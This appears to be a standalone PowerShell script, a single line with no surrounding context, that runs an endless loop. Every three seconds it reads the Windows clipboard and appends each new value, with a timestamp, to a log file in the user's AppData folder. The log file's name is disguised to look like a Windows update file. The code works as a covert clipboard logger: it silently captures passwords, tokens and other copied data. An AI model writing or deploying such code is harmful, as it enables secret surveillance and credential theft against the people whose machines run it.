$pc = "";while ($true) { $c = Get-Clipboard; if ($c -and $c -ne $pc) { "$(Get-Date): $c" | Out-File "$env:APPDATA\updatesKB7331Jakl_log.txt" -Append }; $pc = $c; Start-Sleep -Seconds 3 }
